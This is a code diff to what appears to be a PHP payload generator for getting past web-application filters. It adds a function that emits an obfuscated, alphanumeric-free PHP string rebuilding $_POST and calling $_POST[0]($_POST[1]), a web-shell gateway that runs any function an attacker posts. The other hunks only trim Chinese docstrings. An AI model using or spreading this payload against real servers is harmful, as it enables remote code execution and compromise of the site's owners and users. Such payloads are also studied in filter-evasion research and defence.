@@ -245,6 +245,23 @@ def generate_php_increment(text: str):
     return ";".join(parts)
 
 
+def generate_nan_seed_post_gateway(func_index="0", arg_index="1"):
+    """
+    使用 NAN/自增 逻辑构造 _POST，再调用 $_POST[func_index]($_POST[arg_index])
+    适用于数字 0/1 未被过滤的无字母数字场景。
+    """
+    return (
+        "$_=([].[])[0];"
+        "$_=($_/$_.$_)[0];"
+        "$_++;"
+        "$__=$_.$_++;"
+        "$_++;$_++;$_++;"
+        "$__.=$_;"
+        "$_++;"
+        f"$_=_.$__.$_;$$_[{func_index}]($$_[{arg_index}]);"
+    )
+
+
 def obfuscate_filename_escape(path: str):
     """
     插入转义符 "\\"
@@ -335,7 +352,7 @@ def _split_string_to_vars(text: str):
 
 def get_encoding_strategies():
     """
-    获取所有编码策略
+    获取所有编码
     """
     return [
         ("url", url_encode),
@@ -349,7 +366,7 @@ def get_encoding_strategies():
 
 def _strip_regex_delimiters(token: str):
     """
-    剥离正则表达式分隔符
+    正则表达式分隔符
     """
     token = token.strip()
     if token.startswith("/") and token.endswith("/"):
